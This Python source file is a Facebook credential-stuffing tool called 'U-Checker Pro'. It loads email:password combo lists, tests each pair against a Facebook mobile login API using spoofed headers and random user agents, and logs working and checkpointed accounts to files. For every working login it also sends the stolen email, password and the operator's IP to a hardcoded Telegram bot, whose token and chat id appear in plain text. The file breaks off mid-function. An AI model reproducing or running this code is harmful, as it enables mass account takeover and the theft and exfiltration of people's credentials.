import requests
import random,json,threading
import time,sys,os
import datetime
#from fake_useragent import UserAgent as ua
R = "\033[1;31m"
G = "\033[1;32m"
Y = "\033[1;33m"
C = "\033[1;36m"
W = "\033[1;37m"
B = "\033[1;90m"
Bl = "\33[94m"
RB = "\033[31m"

pwd = os.getcwd()
def sprint(string):
	for letter in string:
		sys.stdout.write(letter)
		sys.stdout.flush()
		time.sleep(0.002)
def clr():
	os.system("cls" if os.name == "nt" else "clear")

now = datetime.datetime.now()
cap_time = (now.strftime("%A, %d. %B %Y %I:%M%p"))
## TELEGARAM MSG ## 
bot_id = "5409440241:AAFDFjjTDSEWQAfXsazJXOcCj_l8uY6mVlU"
chat_id = "-1001763165365"
e = "┃ 📛 ┣ "
w ="┃ ✅ ┣ "
v = "║"
h = "╔════════U-SOCIETY═════════╗"
d = f"╠{e}"
u = "╚════════U-SOCIETY═════════╝"
j = f"╠══{w}"
h1 = "-"*50
wt = "CHECKED WITH U-Checker Pro"
c = ("●"*50)
poo=("●"*20)
######
logo = f"""
{B}██╗   ██╗       ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗
{R}██║   ██║      ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝
{B}██║   ██║█████╗██║     ███████║█████╗  ██║     █████╔╝ 
{R}██║   ██║╚════╝██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ 
{B}╚██████╔╝      ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗
{R} ╚═════╝        ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝ PRO V1.2
{B}●●●●●●●●●●●●●{R}●●●●●●●●●●●●●●●●●{B}●●●●●●●●●●●●●●●●●{R}●●●●●●●●●●●●●●
{R}● Developed By {R}● {B}Dead-Sector
{B}● Team {B}● {R}U-Society
{R}● Telegram {R}● {B}https://t.me/+YR2oG3IwhKdhZmE8
"""

ip = requests.get("https://api.ipify.org").text


divid =(f"{B}●●●●●●●●●●●●●{R}●●●●●●●●●●●●●●●●●{B}●●●●●●●●●●●●●●●●●{R}●●●●●●●●●●●●●●\n")

ugen = ['Mozilla/5.0 (Linux; Android 10; vivo 1935) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; F1f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; vivo 1901 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.9.10.2\t ', 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-US; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.2.5.1300 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0; CPH1609 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36 mCent/0.13.1214', 'Mozilla/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7.1.1; CPH1717 Build/N4F26M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.96 Mobile Safari/537.36 OPR/50.0.2254.149182', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1801 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.68 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1819 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 HeyTapBrowser/15.7.8.1', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1723 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.123 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; A33fw Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.81 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11 Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.1.4.994 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1; in-ID; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.9.8.900 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; vivo 1906 Build/PKQ1.190616.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.3.6.2\t ', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.132 Mobile Safari/537.36 OPR/52.2.2254.54723', 'Mozilla/5.0 (Linux; Android 10; V2032; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.0.4.2\t ', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 OPR/51.0.2254.150807', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-us; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.3.2', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026; rv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Rocket/2.5.1(20460) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-US; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.2.1303 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026; rv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Rocket/2.5.1(20460) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.2490.76 Mobile Safari/537.36 OPR/47.1.2254.147528', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.110 Mobile Safari/537.36 OPR/52.1.2254.54298', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36 YaApp_Android/11.01 YaSearchBrowser/11.01', 'Mozilla/5.0 (Linux; U; Android 5.1; zh-cn; OPPO A59m Build/LMY47I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/1.0.0.100 U3/0.8.0 Mobile Safari/534.30 AliApp(TB/6.6.2) WindVane/8.0.0 720X1280 GCanvas/1.4.2.21', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.2490.76 Mobile Safari/537.36 OPR/33.0.2254.125672', 'Mozilla/5.0 (Linux; U; Android 8.1.0; in-id; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 HeyTapBrowser/15.7.8.0.3beta', 'Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; CPH1701 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.5.1304 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; CPH1701 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-us; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.3.2', 'Mozilla/5.0 (Linux; U; Android 5.1; en-US; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.5.1304 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.91 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36 YaApp_Android/9.99 YaSearchBrowser/9.99', 'Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1; en-US; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.8.1305 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 Mobile Safari/537.36 YaApp_Android/11.01 YaSearchBrowser/11.01', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1717 Build/N4F26M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.93 Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.110 Mobile Safari/537.36 OPR/51.0.2254.150807', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-gb; CPH1727 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/15.5.1.10', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/73.0.3683.90 Mobile Safari/537.36 OPR/35.3.2254.129226', 'Mozilla/5.0 (Linux; U; Android 8.1.0; id-ID; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.10.3.900 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; CPH1701 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.13.5.1209 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7.1.1; CPH1729 Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 Mobile Safari/537.36 OPR/51.0.2254.150807', 'Mozilla/5.0 (Linux; Android 6.0; CPH1609 Build/MRA58K; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36 Puffin/9.0.0.50263AP', 'Mozilla/5.0 (Linux; Android 9; vivo 1904 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.3.6.2\t ', 'Mozilla/5.0 (Linux; U; Android 5.1; en-US; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.2.8.1301 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; A33fw Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1; en-US; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.0.0.1288 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1; A37f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.93 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11 Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.1.1.991 Mobile Safari/537.36NULL', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-US; CPH1717 Build/N4F26M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.0.0.1288 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; Infinix X5515F Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.66 Mobile Safari/537.36 OPR/52.1.2254.54298', 'Mozilla/5.0 (Linux; U; Android 8.1.0; en; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.10.3.900 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.141 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1723 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.123 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.81 Mobile Safari/537.36 OPR/50.0.2254.149182', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1801 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.91 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.4.0.42081AP', 'Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36 OPR/47.1.2249.129326', 'Mozilla/5.0 (Linux; Android 11; V2036; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.9.4.4\t ', 'Mozilla/5.0 (Linux; Android 6.0.1; vivo 1610 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.107 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.3.1.41624AP', 'Mozilla/5.0 (Linux; U; Android 5.1; A1601 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.149 Mobile Safari/537.36 OPR/51.0.2254.150807', 'Mozilla/5.0 (Linux; U; Android 6.0; ms-MY; vivo 1609 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.10.3.900 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1820 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/7.4.0.0\t ', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-gb; CPH1727 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/15.5.1.10', 'Mozilla/5.0 (Linux; U; Android 5.1.1; en-US; A37f Build/LMY47V) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.0.828 U3/0.8.0 Mobile Safari/534.30', 'Mozilla/5.0 (Linux; U; Android 5.1; zh-cn; OPPO A59m Build/LMY47I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/1.0.0.100 U3/0.8.0 Mobile Safari/534.30 AliApp(TB/6.7.0) WindVane/8.0.0 720X1280 GCanvas/1.4.2.21', 'Mozilla/5.0 (Linux; U; Android 7.1.1; CPH1717 Build/N4F26M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36 OPR/51.0.2254.150807', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-us; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.0.1', 'Mozilla/5.0 (Linux; U; Android 7.1.1; CPH1729 Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.117 Mobile Safari/537.36 OPR/47.0.2254.146760', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1.1; en-US; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.12.3.1219 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; A33f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/72.0.3626.105 Mobile Safari/537.36 OPR/52.2.2254.54574', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-gb; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 HeyTapBrowser/15.7.8.0.1beta', 'Mozilla/5.0 (Linux; Android 5.1; A37f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.93 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-US; CPH1717 Build/N4F26M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.0.0.1288 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1801 Build/NMF26F; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.3.1.41624AP', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1801 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.68 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-US; CPH1717 Build/N4F26M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.2.0.1296 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-us; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.3.2', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1801 Build/NMF26F; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.3.1.41624AP', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 OPR/51.0.2254.150807', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-us; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.2.0.4beta', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1; A1601 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.2490.76 Mobile Safari/537.36 OPR/28.0.2254.119224', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.136 Mobile Safari/537.36 OPR/50.0.2254.149182', 'Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; OPPO R9s Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/37.0.0.0 MQQBrowser/7.2 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; V2036; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.9.4.4\t ', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1727 Build/N6F26Q; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.3.1.41624AP', 'Mozilla/5.0 (Linux; U; Android 7.1.1; CPH1729 Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36 OPR/51.0.2254.150807']

ua = random.choice(ugen)





class fb_checker:
	def __init__(self):
		self.ccountt = []
		self.combos = []
		self.cp = []
		self.proxies = []
		self.chits = []
		self.cretries = []
		self.cbad = []
		self.xcp = 0
		self.hits = 0
		self.countt = 0
		self.bad = 0
		self.retries = 0
		self.lock = threading.Lock()
				
	def getCombos(self):
		clr()
		sprint(logo)
		sprint(divid)
		global in_file
		try:
			path = input(f"{B}● {R}●[{C}?{B}]{B}● {R}Enter Combo List{B}●{R}")
			out_file = input(f"{B}● {R}●[{C}?{B}]{B}● {R}Enter File Name {B}●{R}")
			in_file = (f"{out_file}")
			with open(path, 'r', encoding="utf-8") as f:
				for lo in f:
				    self.combos.append(lo.replace('\n', ''))
		except:
			pass
			
	def checker(self,email,passw):
		global sub_pwd
		sub_name = "u-checker_pro"
		if not os.path.exists("results"):
			os.makedirs("results")
		if not os.path.exists("results/{}".format(sub_name)):
			os.makedirs("results/{}".format(sub_name))
		sub_pwd = (f"results/{sub_name}")
		try:
			bd = random.randint(2e+07, 3e+07)
			sim = random.randint(200000, 400000)
			header = {'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','user-agent': ua,'x-fb-connection-type': 'unknown','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger' }
			data = requests.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + email + '&password=' + passw + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&user-agent=Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=900,height=1600}&cpl=true', headers = header).text
			if "Invalid username or password" in data:
				self.lock.acquire()
				self.bad =+ 1
				self.cbad.append(self.bad)
				self.countt =+ 1
				self.ccountt.append(self.countt)
				self.lock.release()
			elif "Service temporarily unavailable" in data:
				self.lock.acquire()
				self.bad =+ 1
				self.cbad.append(self.bad)
				self.countt =+ 1
				self.ccountt.append(self.countt)
				self.lock.release()
			elif "Invalid application" in data:
				self.lock.acquire()
				self.bad =+ 1
				self.cbad.append(self.bad)
				self.countt =+ 1
				self.ccountt.append(self.countt)
				self.lock.release()
			elif "The parameter password is required" in data:
				self.lock.acquire()
				self.bad =+ 1
				self.cbad.append(self.bad)
				self.countt =+ 1
				self.ccountt.append(self.countt)
				self.lock.release()
			elif "Invalid username or email address" in data:
				self.lock.acquire()
				self.bad =+ 1
				self.cbad.append(self.bad)
				self.countt =+ 1
				self.ccountt.append(self.countt)
				self.lock.release()
			elif "www.facebook.com" in data:
				self.lock.acquire()
				self.xcp =+ 1
				self.cp.append(self.xcp)
				self.countt =+ 1
				self.ccountt.append(self.countt)
				cp_msg = f"""
{poo}
{Bl}CHECKPOINT FACEBOOK ID
{R}{c}
{W}  ├ IP ● {ip}
{W}  ┊   ├ EMAIL ● {email}
  ┊   ├ PASSWORD ● {passw}
  ┊   └ TIME ● {cap_time}
  └ text: /start
{R}{c}
"""
				print(cp_msg)
				open(f"results/{sub_name}/{in_file}_cp.txt","a").write(f"{h1}\n{wt}\nEMAIL ● {email}\nPASS ● {passw}\n{h1}\n")
				#msg = f"""
#CHECKPOINT FACEBOOK ID
#{poo}
#  ├ IP ● {ip}
#  ┊   ├ EMAIL ● {email}
#  ┊   ├ PASSWORD ● {passw}
#  ┊   └ TIME ● {cap_time}
#  └ text: /start
#{poo}  
#"""
#				url1 = (f"https://api.telegram.org/bot{bot_id}/sendMessage?chat_id={chat_id}&text={msg}")
#				rqq = requests.get(url1)
				self.lock.release()
			elif "Calls to this api have exceeded the rate limit." in data:
				self.lock.acquire()
				self.bad =+ 1
				self.cbad.append(self.bad)
				self.countt =+ 1
				self.ccountt.append(self.countt)
				self.lock.release()
			elif "You can't log in right now" in data:
				self.lock.acquire()
				self.bad =+ 1
				self.cbad.append(self.bad)
				self.lock.release()
			elif "User not visible" in data:
				self.lock.acquire()
				self.bad =+ 1
				self.cbad.append(self.bad)
				self.countt =+ 1
				self.ccountt.append(self.countt)
				self.lock.release()
			elif "session_key" in data:
				self.lock.acquire()
				self.hits =+ 1
				self.chits.append(self.hits)
				self.countt =+ 1
				self.ccountt.append(self.countt)
				hit_msg = f"""
{G}LIVE FACEBOOK ID
{R}{c}
{W}  ├ IP ● {ip}
{W}  ┊   ├ EMAIL ● {email}
  ┊   ├ PASSWORD ● {passw}
  ┊   └ TIME ● {cap_time}
  └ text: /start
{R}{c}  
"""
				print(hit_msg)
				open(f"results/{sub_name}/{in_file}_Hits.txt","a").write(f"{h}\n{wt}\nEMAIL ● {email}\nPASS ● {passw}\n{h1}\n")
				msg = f"""
{poo}
LIVE FACEBOOK ID
{poo}
  ├ IP ● {ip}
  ┊   ├ EMAIL ● {email}
  ┊   ├ PASSWORD ● {passw}
  ┊   └ TIME ● {cap_time}
  └ text: /start
{poo}  
"""
				url = (f"https://api.telegram.org/bot{bot_id}/sendMessage?chat_id={chat_id}&text={msg}")
				rqq = requests.get(url)
				self.lock.release()
			else:
				self.lock.acquire()
				self.bad=+ 1
				self.cbad.append(self.hits)
